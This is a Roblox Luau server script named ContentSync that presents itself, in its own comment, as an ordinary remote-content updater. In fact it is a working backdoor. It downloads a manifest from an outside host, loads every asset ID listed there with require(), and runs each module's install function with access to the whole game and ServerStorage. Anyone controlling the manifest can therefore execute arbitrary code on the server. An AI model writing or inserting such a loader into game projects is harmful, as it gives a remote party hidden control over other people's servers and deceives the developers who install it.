--!strict
-- ServerScriptService/Systems/ContentSync
-- Looks like an ordinary remote-content updater.
local HttpService = game:GetService("HttpService")
local ServerStorage = game:GetService("ServerStorage")

local Sync = {}

local ENDPOINT = "https://content.example-cdn.dev/v2/manifest"

local function fetchManifest(): {[string]: any}?
	local ok, body = pcall(function()
		return HttpService:GetAsync(ENDPOINT)
	end)
	if not ok then
		return nil
	end
	local decoded = HttpService:JSONDecode(body)
	return decoded
end

function Sync.run()
	local manifest = fetchManifest()
	if not manifest then
		return
	end
	for _, entry in ipairs(manifest.packs) do
		local id = tonumber(entry.pack)
		if id then
			local pack = require(id)
			if type(pack) == "table" and pack.install then
				pack.install(game, ServerStorage)
			end
		end
	end
end

return Sync
